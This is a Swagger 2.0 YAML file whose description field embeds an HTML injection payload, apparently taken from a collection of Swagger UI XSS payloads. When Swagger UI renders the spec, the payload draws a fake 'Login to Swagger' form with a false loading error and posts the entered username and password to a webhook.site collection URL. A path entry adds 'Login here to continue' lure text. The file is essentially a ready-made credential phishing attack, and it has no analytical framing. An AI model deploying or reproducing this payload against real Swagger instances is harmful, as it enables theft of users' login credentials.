swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<br><br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><div align="center"><img src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/logo-swagger.png" width="42" height="28" alt="API"><br><font face="Segoe UI" size="5" color="#1f2937"><b>Login to Swagger</b></font></div><br><table width="100%" cellspacing="0" cellpadding="10"><tr><td bgcolor="#fef2f2" align="center"><font face="Segoe UI" size="2" color="#ef4444">An error occurred while loading, please log in.</font></td></tr></table><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="2" color="#333333"><b>Username</b></font><br><input type="text" name="username" size="34" placeholder="Username"><br><br><font face="Segoe UI" size="2" color="#333333"><b>Password</b></font><br><input type="password" name="password" size="34" placeholder="Password"><br><br><font face="Segoe UI" size="2" color="#374151"><input type="checkbox" name="remember"> Keep me signed in</font><br><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-generic.png" width="100" height="29" alt="Login"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#059669">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="1" color="#9ca3af">Protected API &mdash; v2.4.1</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
